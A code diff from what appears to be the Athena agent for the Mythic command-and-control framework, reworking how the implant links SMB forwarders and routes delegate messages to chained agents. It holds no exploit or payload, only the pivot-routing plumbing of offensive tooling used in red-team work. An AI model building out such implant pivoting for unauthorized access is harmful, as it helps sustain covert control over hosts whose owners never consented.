@@ -1,10 +1,15 @@
 ﻿using Athena.Forwarders;
+using Athena.Models;
+using Athena.Models.Comms.Tasks;
 using Athena.Models.Config;
 using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
+using Athena.Models.ResponseResults;
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.Text;
 using System.Text.Json;
+using System.Text.Json.Serialization;
 
 namespace Athena.Handler.Common
 {
@@ -20,11 +25,10 @@ namespace Athena.Handler.Common
 
         }
 
-        public async Task<bool> LinkForwarder(MythicJob job, string uuid)
+        public async Task<EdgeResponseResult> LinkForwarder(MythicJob job, string uuid, string agent_id)
         {
             Debug.WriteLine($"[{DateTime.Now}] Initiating forwarder link");
-
-            //return await fwrdr.Link(job, uuid);
+            string id = Guid.NewGuid().ToString();
 
             //Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
 
@@ -33,42 +37,67 @@ namespace Athena.Handler.Common
             {
                 case "smb":
                     //Generate temporary UUID so we're at least tracking something
-                    string id = Guid.NewGuid().ToString();
-                    Console.WriteLine("Our Guid: " + id);
+                    this.tempForwarders.TryAdd(id, new SMBForwarder(id, agent_id));
                     //Add to our tracker
-                    if (!this.tempForwarders.TryAdd(id, new SMBForwarder(id)))
-                    {
-                        return false;
-                    }
                     Debug.WriteLine($"[{DateTime.Now}] Added forwarder to temp tracker.");
+                    EdgeResponseResult err = await this.tempForwarders[id].Link(job, uuid);
 
-                    //Attempt to link to the forwarder
-                    if (!await this.tempForwarders[id].Link(job, uuid))
+                    if(err.edges.Count > 0)
                     {
-                        Debug.WriteLine($"[{DateTime.Now}] Removing from our tracker.");
-                        this.tempForwarders.Remove(id, out _); //Delete it from our list if the link failed.
-                        return false;
+                        this.forwarders.TryAdd(err.edges.First().destination, this.tempForwarders[id]);
+                        this.messageQueue.TryAdd(err.edges.First().destination, new ConcurrentQueue<DelegateMessage>());
                     }
-                    break;
+
+
+                    Debug.WriteLine($"[{DateTime.Now}] New Edge Added: {err.edges.First().destination}");
+                    //Figure out how to get proper ID's based on each thing
+                    //Maybe add an event handler to update agent ids?
+
+                    return err;
                 default:
                     break;
             }
 
-            return true;
+            return new EdgeResponseResult()
+            {
+                task_id = job.task.id,
+                user_output = "Failed to link, no valid forwarder specified.",
+                completed = true,
+                edges = new List<Edge>()
+            };
+        }
+
+        public async Task<bool> UnlinkForwarder(string id)
+        {
+            return await this.forwarders[id].Unlink() && this.forwarders.TryRemove(id, out _);
+        }
+
+        public async Task<string> ListForwarders()
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (var fwdr in this.forwarders)
+            {
+                sb.AppendLine($"ID: {fwdr.Value.id}\tType: {fwdr.Value.profile_type}\tConnected: {fwdr.Value.connected}");
+            }
+
+            return sb.ToString();
         }
 
         public async Task HandleDelegateMessages(List<DelegateMessage> messages)
         { 
-
+            //If we're relinking to an agent, the old agent is forwarding its proper 
             foreach(var msg in messages)
             {
-                if (string.IsNullOrEmpty(msg.uuid))
+                string id = msg.uuid;
+                Debug.WriteLine($"[{DateTime.Now}] Delegate from Mythic: {JsonSerializer.Serialize(msg, DelegateMessageJsonContext.Default.DelegateMessage)}");
+                if (!string.IsNullOrEmpty(msg.new_uuid))
                 {
-                    bool success = this.messageQueue.TryAdd(msg.new_uuid, new ConcurrentQueue<DelegateMessage>());
-                    msg.uuid = msg.new_uuid;
+                    Debug.WriteLine($"[{DateTime.Now}] Updating Agent ID - (new_uuid): {msg.new_uuid}\t(mythic_uuid): {msg.mythic_uuid}");
+                    id = msg.new_uuid;
+                    //msg.uuid = msg.new_uuid;
                 }
-                Debug.WriteLine($"[{DateTime.Now}] Adding message for agent: {msg.new_uuid}");
-                this.messageQueue[msg.uuid].Enqueue(msg);
+                bool success = this.messageQueue.TryAdd(id, new ConcurrentQueue<DelegateMessage>());
+                this.messageQueue[id].Enqueue(msg);
             }
 
             Parallel.ForEach(messageQueue, async queue =>
@@ -87,25 +116,26 @@ namespace Athena.Handler.Common
 
         private async Task<bool> HandleDelegate(DelegateMessage dm)
         {
-            Console.WriteLine("Handling Delegate.");
+            string id = dm.uuid;
+
+            if (!string.IsNullOrEmpty(dm.new_uuid))
+            {
+                Debug.WriteLine($"[{DateTime.Now}] New UUID Received: {dm.new_uuid}");
+                id = dm.new_uuid;
+            }
             if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
             {
-                Console.WriteLine("Adding forwarder key");
+                Debug.WriteLine($"[{DateTime.Now}] Forwarder doesn't contain ID: {id}, finding out if it's in tempForwarders {this.tempForwarders.ContainsKey(id)}");
                 SMBForwarder fwd;
-                if (this.tempForwarders.TryRemove(this.tempForwarders.First().Key, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
+                if (this.tempForwarders.TryRemove(dm.uuid, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
                 {
-
-                    if(fwd is null)
-                    {
-                        Console.WriteLine("Fwd is null");
-                    }
-                    Console.WriteLine(this.forwarders.TryAdd(dm.uuid, fwd)); //Add to our permanent tracker
-                    this.forwarders[dm.uuid].id = dm.uuid;
+                    this.forwarders.TryAdd(dm.new_uuid, fwd);
+                    this.forwarders[dm.new_uuid].id = dm.new_uuid;
+                    dm.uuid = dm.new_uuid;
                 }
             }
-            Console.WriteLine("Forwarding Delegate.");
-            //Should I wait after this or should I just let it go? Delay between them?
-            return await this.forwarders[dm.uuid].ForwardDelegateMessage(dm);
+
+            return await this.forwarders[id].ForwardDelegateMessage(dm);
         }
     }
 }
